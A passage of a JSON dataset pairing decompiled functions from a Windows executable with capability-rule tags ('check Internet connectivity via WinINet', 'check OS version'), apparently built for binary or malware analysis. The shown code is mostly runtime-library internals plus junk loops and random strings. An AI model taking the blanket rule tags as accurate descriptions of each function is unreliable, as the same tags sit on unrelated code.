}\n    }\n    *var_2ch = pcVar8;\n    var_2ch[1] = pcVar7;\ncode_r0x004934c6:\n    fcn.004030bc(unaff_ESI);\n    return;\n}\n",
        "token_count": 1286
    },
    "00402978": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402978(uint arg_8h, uint32_t arg_ch, int32_t *arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t **in_ECX;\n    uint32_t uVar2;\n    uint var_4h;\n    \n    if (arg_ch == 0) {\n        return;\n    }\n    piVar1 = *in_ECX;\n    if (piVar1[2] == piVar1[1]) {\n        if (*(piVar1 + 3) == '\\0') {\ncode_r0x004a9afb:\n            *arg_10h = -1;\n            return;\n        }\n    }\n    else {\n        uVar2 = piVar1[1] - piVar1[2];\n        if (arg_ch <= uVar2) {\n            uVar2 = arg_ch;\n        }\n        fcn.00405830(*piVar1, arg_8h, uVar2 * 2);\n        **in_ECX = **in_ECX + uVar2 * 2;\n        (*in_ECX)[2] = (*in_ECX)[2] + uVar2;\n        if (*(*in_ECX + 3) == '\\0') {\n            if (uVar2 == arg_ch) {\n                *arg_10h = *arg_10h + uVar2;\n                return;\n            }\n            goto code_r0x004a9afb;\n        }\n    }\n    *arg_10h = *arg_10h + arg_ch;\n    return;\n}\n",
        "token_count": 338
    },
    "004029a5": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.004029a5(uint arg_8h)\n\n{\n    int32_t *in_FS_OFFSET;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    int32_t var_2ch;\n    int32_t var_28h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_14h = 0x44ff20;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    for (var_28h = 0x5c; 0 < var_28h; var_28h = var_28h + -1) {\n    }\n    for (var_2ch = 0x3b; 0 < var_2ch; var_2ch = var_2ch + -1) {\n    }\n    for (var_30h = 100; 0 < var_30h; var_30h = var_30h + -1) {\n    }\n    var_10h = 0;\n    fcn.00401e79(0x544a21);\n    fcn.00403b02();\n    *in_FS_OFFSET = var_18h;\n    return arg_8h;\n}\n",
        "token_count": 327
    },
    "004029af": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.004029af(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h)\n\n{\n    int32_t var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.004058a8(arg_8h);\n    fcn.004e15d5(&var_ch, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h, arg_24h);\n    if (var_4h != '\\0') {\n        *(var_10h + 0x350) = *(var_10h + 0x350) & 0xfffffffd;\n    }\n    return;\n}\n",
        "token_count": 198
    },
    "00402a1d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402a1d(uint32_t arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t *puVar1;\n    code *pcVar2;\n    uint32_t *puVar3;\n    uint32_t **ppuVar4;\n    uint32_t *puVar5;\n    uint32_t *puVar6;\n    uint var_4h;\n    \n    ppuVar4 = fcn.00406924();\n    if (ppuVar4 == NULL) {\n        return 0;\n    }\n    puVar1 = *ppuVar4;\n    for (puVar6 = puVar1; puVar6 != puVar1 + 0x24; puVar6 = puVar6 + 3) {\n        if (*puVar6 == arg_8h) goto code_r0x004aa59b;\n    }\n    puVar6 = NULL;\ncode_r0x004aa59b:\n    if (puVar6 == NULL) {\n        return 0;\n    }\n    pcVar2 = puVar6[2];\n    if (pcVar2 == NULL) {\n        return 0;\n    }\n    if (pcVar2 == 0x5) {\n        puVar6[2] = 0;\n        return 1;\n    }\n    if (pcVar2 == 0x1) {\n        return 0xffffffff;\n    }\n    puVar3 = ppuVar4[1];\n    ppuVar4[1] = arg_ch;\n    if (puVar6[1] != 8) {\n        puVar6[2] = 0;\n        (**0x578000)(puVar6[1]);\n        (*pcVar2)();\n        goto code_r0x004aa6a8;\n    }\n    for (puVar5 = puVar1 + 9; puVar5 != puVar1 + 0x24; puVar5 = puVar5 + 3) {\n        puVar5[2] = 0;\n    }\n    puVar1 = ppuVar4[2];\n    puVar5 = puVar1;\n    if (*puVar6 < 0xc0000092) {\n        if (*puVar6 == 0xc0000091) {\n            puVar5 = 0x84;\n        }\n        else if (*puVar6 == 0xc000008d) {\n            puVar5 = 0x82;\n        }\n        else if (*puVar6 == 0xc000008e) {\n            puVar5 = 0x83;\n        }\n        else if (*puVar6 == 0xc000008f) {\n            puVar5 = 0x86;\n        }\n        else {\n            if (*puVar6 != 0xc0000090) goto code_r0x004aa685;\n            puVar5 = 0x81;\n        }\ncode_r0x004aa682:\n        ppuVar4[2] = puVar5;\n    }\n    else {\n        if (*puVar6 == 0xc0000092) {\n            puVar5 = 0x8a;\n            goto code_r0x004aa682;\n        }\n        if (*puVar6 == 0xc0000093) {\n            puVar5 = 0x85;\n            goto code_r0x004aa682;\n        }\n        if (*puVar6 == 0xc00002b4) {\n            puVar5 = 0x8e;\n            goto code_r0x004aa682;\n        }\n        if (*puVar6 == 0xc00002b5) {\n            puVar5 = 0x8d;\n            goto code_r0x004aa682;\n        }\n    }\ncode_r0x004aa685:\n    (**0x578000)(8, puVar5);\n    (*pcVar2)();\n    ppuVar4[2] = puVar1;\ncode_r0x004aa6a8:\n    ppuVar4[1] = puVar3;\n    return 0xffffffff;\n}\n",
        "token_count": 874
    },
    "00402a40": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.00402a40(uint arg_8h)\n\n{\n    int32_t **in_FS_OFFSET;\n    int32_t iStack164;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    uStack28 = 0x450720;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack24 = 0;\n    fcn.00401e79(\"mhjvojjigdvsoctynyklef\");\n    uStack24 = 1;\n    fcn.00401e79(\"qyriwwjlyxsqxfvvxtyowsjxdb\");\n    uStack24 = 2;\n    fcn.00401e79(\"rwzzbtfvmnxfnwflsibegkvmflmblhbhzleno\");\n    uStack24 = 3;\n    fcn.00401e79(\"tndmbtbvjidrlugpgoukmkteconzwaoahkxoyegnulmvxnyrdksguchnswqqsjxcenuhqmtpnkurcpmhcle\");\n    for (iStack164 = 0x33; 0 < iStack164; iStack164 = iStack164 + -1) {\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return 0x7c48;\n}\n",
        "token_count": 368
    },
    "00402a45": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00402a45(int32_t *arg_8h)\n\n{\n    int16_t iVar1;\n    uint *puVar2;\n    uint32_t uVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        iVar1 = *(*(in_ECX + 0x14) + -4);\n    }\n    else {\n        uVar3 = *(in_ECX + 0xaa8);\n        if (99 < uVar3) {\n            puVar2 = fcn.00403a35();\n            *puVar2 = 0x16;\n            uVar3 = fcn.004037ce();\n            return uVar3 & 0xffffff00;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar3 = fcn.004038a0(in_ECX + 0x464 + uVar3 * 0x10, 1, *(in_ECX + 0x32), *(in_ECX + 0x2c));\n            return uVar3;\n        }\n        iVar1 = **(in_ECX + 0x46c + uVar3 * 0x10);\n    }\n    *arg_8h = iVar1;\n    arg_8h[1] = iVar1 >> 0x1f;\n    return CONCAT31(iVar1 >> 8, 1);\n}\n",
        "token_count": 345
    },
    "00402a59": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402a59(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint uVar3;\n    int32_t *piVar4;\n    int32_t in_ECX;\n    uint32_t var_4h;\n    \n    piVar2 = *(in_ECX + 0xc);\n    if (piVar2 == NULL) {\n        piVar2 = fcn.00403a35();\n        *(in_ECX + 0xc) = piVar2;\n    }\n    iVar1 = *piVar2;\n    *piVar2 = 0;\n    var_4h = 0;\n    uVar3 = fcn.00404999(*(in_ECX + 0x10) + -1, &var_4h, 10);\n    *arg_8h = uVar3;\n    piVar4 = *(in_ECX + 0xc);\n    if (piVar4 == NULL) {\n        piVar4 = fcn.00403a35();\n        *(in_ECX + 0xc) = piVar4;\n    }\n    if ((*piVar4 == 0x22) || (var_4h < *(in_ECX + 0x10))) {\n        uVar3 = 0;\n    }\n    else {\n        *(in_ECX + 0x10) = var_4h;\n        uVar3 = 1;\n    }\n    if ((*piVar2 == 0) && (iVar1 != 0)) {\n        *piVar2 = iVar1;\n    }\n    return uVar3;\n}\n",
        "token_count": 355
    },
    "00402a90": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.00402a90(uint32_t *param_1)\n\n{\n    uint32_t *arg_14h;\n    char *pcVar1;\n    bool bVar2;\n    bool bVar3;\n    char cVar4;\n    uchar uVar5;\n    uint *puVar6;\n    uint32_t uVar7;\n    int32_t arg_ch;\n    int32_t arg_10h;\n    uint arg_8h;\n    uint arg_ch_00;\n    int32_t iStack12;\n    uint uStack8;\n    \n    cVar4 = *(param_1 + 0x31);\n    if (cVar4 != 'F') {\n        if (cVar4 == 'N') {\n            if ((*param_1 & 8) != 0) {\n                return 1;\n            }\n            param_1[7] = 8;\n        }\n        else if (param_1[0xb] == 0) {\n            if (cVar4 < 'k') {\n                if (cVar4 == 'j') {\n                    param_1[0xb] = 5;\n                    return 1;\n                }\n                if (cVar4 == 'I') {\n                    pcVar1 = param_1[4];\n                    cVar4 = *pcVar1;\n                    if ((cVar4 == '3') && (pcVar1[1] == '2')) {\n                        param_1[0xb] = 10;\n                        param_1[4] = pcVar1 + 2;\n                        return 1;\n                    }\n                    if ((cVar4 == '6') && (pcVar1[1] == '4')) {\n                        param_1[0xb] = 0xb;\n                        param_1[4] = pcVar1 + 2;\n                        return 1;\n                    }\n                    if (((((cVar4 != 'd') && (cVar4 != 'i')) && (cVar4 != 'o')) && ((cVar4 != 'u' && (cVar4 != 'x'))))\n                       && (cVar4 != 'X')) {\n                        return 1;\n                    }\n                    param_1[0xb] = 9;\n                    return 1;\n                }\n                if (cVar4 == 'L') {\n                    param_1[0xb] = 8;\n                    return 1;\n                }\n                if (cVar4 == 'T') {\n                    param_1[0xb] = 0xd;\n                    return 1;\n                }\n                if (cVar4 != 'h') {\n                    return 1;\n                }\n                if (*param_1[4] == 'h') {\n                    param_1[4] = param_1[4] + 1;\n                    uVar7 = 1;\n                }\n                else {\n                    uVar7 = 2;\n                }\n            }\n            else {\n                if (cVar4 != 'l') {\n                    if (cVar4 == 't') {\n                        param_1[0xb] = 7;\n                        return 1;\n                    }\n                    if (cVar4 == 'w') {\n                        param_1[0xb] = 0xc;\n                        return 1;\n                    }\n                    if (cVar4 == 'z') {\n                        param_1[0xb] = 6;\n                        return 1;\n                    }\n                    return 1;\n                }\n                if (*param_1[4] == 'l') {\n                    param_1[4] = param_1[4] + 1;\n                    uVar7 = 4;\n                }\n                else {\n                    uVar7 = 3;\n                }\n            }\n            param_1[0xb] = uVar7;\n            return 1;\n        }\n        puVar6 = fcn.00403a35();\n        *puVar6 = 0x16;\n        fcn.004037ce();\n        return 0;\n    }\n    if ((*param_1 & 8) != 0) {\n        return 1;\n    }\n    param_1[7] = 7;\n    cVar4 = *(param_1 + 0x31);\n    uStack8 = param_1;\n    if (cVar4 < 'e') {\n        if (cVar4 == 'd') {\ncode_r0x004a0917:\n            param_1[8] = param_1[8] | 0x10;\ncode_r0x004a091b:\n            arg_ch_00 = 0;\n            arg_8h = 10;\ncode_r0x004a091e:\n            cVar4 = fcn.00404b92(arg_8h, arg_ch_00);\n        }\n        else if (cVar4 < 'Y') {\n            if (cVar4 == 'X') {\n                arg_ch_00 = 1;\ncode_r0x004a08c3:\n                arg_8h = 0x10;\n                goto code_r0x004a091e;\n            }\n            if (cVar4 != 'A') {\n                if (cVar4 == 'C') goto code_r0x004a08d7;\n                if (cVar4 < 'E') {\n                    return 0;\n                }\n                if ('G' < cVar4) {\n                    if (cVar4 != 'S') {\n                        return 0;\n                    }\n                    goto code_r0x004a08ab;\n                }\n            }\ncode_r0x004a0927:\n            cVar4 = fcn.004039d6();\n        }\n        else if (cVar4 == 'Z') {\n            cVar4 = fcn.00401d39();\n        }\n        else {\n            if (cVar4 == 'a') goto code_r0x004a0927;\n            if (cVar4 != 'c') {\n                return 0;\n            }\ncode_r0x004a08d7:\n            cVar4 = fcn.00401fa0(0);\n        }\n    }\n    else if (cVar4 < 'q') {\n        if (cVar4 == 'p') {\n            cVar4 = fcn.00401136();\n        }\n        else {\n            if (cVar4 < 'h') goto code_r0x004a0927;\n            if (cVar4 == 'i') goto code_r0x004a0917;\n            if (cVar4 == 'n') {\n                cVar4 = fcn.004044e9();\n            }\n            else {\n                if (cVar4 != 'o') {\n                    return 0;\n                }\n                cVar4 = fcn.00402644();\n            }\n        }\n    }\n    else {\n        if (cVar4 != 's') {\n            if (cVar4 != 'u') {\n                if (cVar4 != 'x') {\n                    return 0;\n                }\n                arg_ch_00 = 0;\n                goto code_r0x004a08c3;\n            }\n            goto code_r0x004a091b;\n        }\ncode_r0x004a08ab:\n        cVar4 = fcn.0040213a();\n    }\n    if (cVar4 == '\\0') {\n        return 0;\n    }\n    if (*(param_1 + 0xc) != '\\0') {\n        return 1;\n    }\n    arg_ch = 0;\n    uStack8 = (uStack8 >> 0x10 & 0xff00) << 0x10;\n    uVar7 = param_1[8];\n    iStack12 = 0;\n    if ((uVar7 >> 4 & 1) != 0) {\n        uStack8._1_3_ = uStack8 >> 8;\n        if ((uVar7 >> 6 & 1) == 0) {\n            if ((uVar7 & 1) == 0) {\n                if ((uVar7 >> 1 & 1) != 0) {\n                    uStack8 = CONCAT31(uStack8._1_3_, 0x20);\n                    arg_ch = 1;\n                    iStack12 = 1;\n                }\n                goto code_r0x004a09ad;\n            }\n            uStack8 = CONCAT31(uStack8._1_3_, 0x2b);\n        }\n        else {\n            uStack8 = CONCAT31(uStack8._1_3_, 0x2d);\n        }\n        iStack12 = 1;\n        arg_ch = 1;\n    }\ncode_r0x004a09ad:\n    cVar4 = *(param_1 + 0x31);\n    if (((cVar4 == 'x') || (cVar4 == 'X')) && ((uVar7 >> 5 & 1) != 0)) {\n        bVar2 = true;\n    }\n    else {\n        bVar2 = false;\n    }\n    if ((cVar4 == 'a') || (cVar4 == 'A')) {\n        bVar3 = true;\n    }\n    else {\n        bVar3 = false;\n    }\n    if ((bVar2) || (bVar3)) {\n        *(&uStack8 + arg_ch) = 0x30;\n        if ((cVar4 == 'X') || (cVar4 == 'A')) {\n            uVar5 = 0x58;\n        }\n        else {\n            uVar5 = 0x78;\n        }\n        *(&uStack8 + arg_ch + 1) = uVar5;\n        arg_ch = arg_ch + 2;\n        iStack12 = arg_ch;\n    }\n    arg_14h = param_1 + 6;\n    arg_10h = (param_1[9] - param_1[0xe]) - arg_ch;\n    if ((*(param_1 + 8) & 0xc) == 0) {\n        fcn.00403d6e(param_1 + 0x112, 0x20, arg_10h, arg_14h);\n        arg_ch = iStack12;\n    }\n    fcn.00405ef2(&uStack8, arg_ch, arg_14h, param_1 + 3);\n    if (((param_1[8] >> 3 & 1) != 0) && ((param_1[8] >> 2 & 1) == 0)) {\n        fcn.00403d6e(param_1 + 0x112, 0x30, arg_10h, arg_14h);\n    }\n    fcn.00404b33(0);\n    if ((-1 < *arg_14h) && ((param_1[8] >> 2 & 1) != 0)) {\n        fcn.00403d6e(param_1 + 0x112, 0x20, arg_10h, arg_14h);\n    }\n    return 1;\n}\n",
        "token_count": 2374
    },
    "00402ac2": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00402ac2(int32_t param_1)\n\n{\n    int32_t iVar1;\n    unkuint3 Var2;\n    bool bVar3;\n    \n    iVar1 = *(param_1 + 0x458);\n    Var2 = iVar1 >> 8;\n    if (iVar1 == 1) {\n        bVar3 = *(param_1 + 0x45c) == 2;\n    }\n    else {\n        if (iVar1 != 2) goto code_r0x0049dd41;\n        bVar3 = *(param_1 + 0x45c) == 0;\n    }\n    if (bVar3) {\n        return CONCAT31(Var2, 1);\n    }\ncode_r0x0049dd41:\n    return Var2 << 8;\n}\n",
        "token_count": 181
    },
    "00402b08": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuchar * __cdecl fcn.00402b08(uint arg_8h, uchar *arg_ch, char *arg_10h, uint32_t arg_14h)\n\n{\n    char *pcVar1;\n    uint var_ch;\n    uint var_8h;\n    char *var_4h;\n    \n    *arg_ch = 0x25;\n    var_4h = arg_ch + 1;\n    if ((arg_14h & 0x20) != 0) {\n        var_4h = arg_ch + 2;\n        arg_ch[1] = '+';\n    }\n    if ((arg_14h & 8) != 0) {\n        *var_4h = '#';\n        var_4h = var_4h + 1;\n    }\n    if (*arg_10h == 'L') {\n        *var_4h = 'I';\n        pcVar1 = var_4h + 2;\n        var_4h[1] = '6';\n        var_4h = var_4h + 3;\n        *pcVar1 = '4';\n    }\n    else {\n        *var_4h = *arg_10h;\n        var_4h = var_4h + 1;\n    }\n    if ((arg_14h & 0xe00) == 0x400) {\n        var_ch._3_1_ = 'o';\n    }\n    else {\n        if ((arg_14h & 0xe00) == 0x800) {\n            var_ch._1_1_ = 'X';\n            if ((arg_14h & 4) == 0) {\n                var_ch._1_1_ = 'x';\n            }\n            var_ch._2_1_ = var_ch._1_1_;\n        }\n        else {\n            var_ch._2_1_ = arg_10h[1];\n        }\n        var_ch._3_1_ = var_ch._2_1_;\n    }\n    *var_4h = var_ch._3_1_;\n    var_4h[1] = '\\0';\n    return arg_ch;\n}\n",
        "token_count": 473
    },
    "00402b6c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.00402b6c(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint arg_10h_00;\n    code *pcVar2;\n    int32_t arg_10h_01;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_20h;\n    uint var_1ch;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.004022de(0x56f0a0, 0x10);\n    arg_10h_01 = fcn.00403cdd(*(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n    *(unaff_EBP + -0x1c) = arg_10h_01;\n    iVar3 = fcn.00402b26();\n    *(iVar3 + 0x18) = *(iVar3 + 0x18) + 1;\n    *(unaff_EBP + -4) = 0;\n    while (arg_10h_01 != *(unaff_EBP + 0x14)) {\n        if ((arg_10h_01 < 0) || (iVar3 = *(unaff_EBP + 0x10),  *(iVar3 + 4) <= arg_10h_01)) goto code_r0x0048aca0;\n        iVar1 = *(iVar3 + 8);\n        arg_10h_00 = *(iVar1 + arg_10h_01 * 8);\n        *(unaff_EBP + -0x20) = arg_10h_00;\n        *(unaff_EBP + -4) = 1;\n        if (*(iVar1 + 4 + arg_10h_01 * 8) != 0) {\n            fcn.004022ca(*(unaff_EBP + 8), iVar3, arg_10h_00);\n            fcn.00403b66(*(*(iVar3 + 8) + 4 + arg_10h_01 * 8), *(unaff_EBP + 8), 0x103);\n        }\n        *(unaff_EBP + -4) = 0;\n        arg_10h_01 = *(unaff_EBP + -0x20);\n        *(unaff_EBP + -0x1c) = arg_10h_01;\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.0048ac8c();\n    if (arg_10h_01 == *(unaff_EBP + 0x14)) {\n        fcn.004022ca(*(unaff_EBP + 8), *(unaff_EBP + 0x10), arg_10h_01);\n        *in_FS_OFFSET = *(unaff_EBP + -0x10);\n        return;\n    }\ncode_r0x0048aca0:\n    fcn.00404f39();\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 728
    },
    "00402bdf": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl fcn.00402bdf(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.004022de(0x56bac0, 8);\n    *(unaff_EBP + -4) = 0;\n    if (((*0x400000 == 0x5a4d) && (*(*0x40003c + 0x400000) == 0x4550)) && (*(*0x40003c + 0x400018) == 0x10b)) {\n        iVar1 = fcn.0046174d(0x400000, *(unaff_EBP + 8) + -0x400000);\n        if ((iVar1 != 0) && (-1 < *(iVar1 + 0x24))) {\n            *(unaff_EBP + -4) = 0xfffffffe;\n            uVar2 = 1;\n            goto code_r0x00461a98;\n        }\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    uVar2 = 0;\ncode_r0x00461a98:\n    *in_FS_OFFSET = *(unaff_EBP + -0x10);\n    return uVar2;\n}\n",
        "token_count": 323
    },
    "00402c20": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402c20(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    for (iVar1 = 4; 0 < iVar1; iVar1 = iVar1 + -1) {\n    }\n    fcn.00403b02(&arg_8h, iVar1, *0x547248);\n    return 0x2d50;\n}\n",
        "token_count": 86
    },
    "00402c4d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuchar __cdecl fcn.00402c4d(uint arg_8h)\n\n{\n    uchar uVar1;\n    \n    if (arg_8h != '\\0') {\n        if (*0x57505c != 0) {\n            fcn.00401f5f();\n        }\n        return 1;\n    }\n    uVar1 = fcn.004032fb(0x556a68, 0x556ae8);\n    return uVar1;\n}\n",
        "token_count": 102
    },
    "00402c89": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00402c89(int32_t *arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    uint in_stack_ffffff9c;\n    uint var_5ch;\n    uint var_58h;\n    uint var_51h;\n    uchar *var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_1ch = &stack0xffffff98;\n    var_10h = 0xffffffff;\n    var_14h = 0x427200;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    if ((arg_8h != NULL) && (*arg_8h == 0)) {\n        iVar1 = fcn.00402513(0x18, in_stack_ffffff9c);\n        var_51h._0_1_ = 1;\n        fcn.00406640();\n        var_10h = 0;\n        fcn.00404714();\n        var_10h = 1;\n        fcn.004053a8(&var_51h + 1, 0);\n        var_51h._0_1_ = 0;\n        *arg_8h = iVar1;\n        fcn.00401fff();\n    }\n    *in_FS_OFFSET = var_18h;\n    return 2;\n}\n",
        "token_count": 332
    },
    "00402c9d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00402c9d(void)\n\n{\n    bool bVar1;\n    uint32_t in_MXCSR;\n    uint16_t in_FPUControlWord;\n    float10 in_ST0;\n    float10 in_ST1;\n    \n    if (*0x575754 != 0) {\n        bVar1 = (in_MXCSR & 0x7f80) == 0x1f80;\n        if (bVar1) {\n            bVar1 = (in_FPUControlWord & 0x7f) == 0x7f;\n        }\n        if (bVar1) {\n            fcn.004d55e9(in_ST1, SUB84(in_ST0, 0), in_ST0 >> 0x20);\n            return;\n        }\n    }\n    fcn.004bc21d(SUB84(in_ST1, 0), in_ST1 >> 0x20, in_ST0);\n    return;\n}\n",
        "token_count": 207
    },
    "00402ca2": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
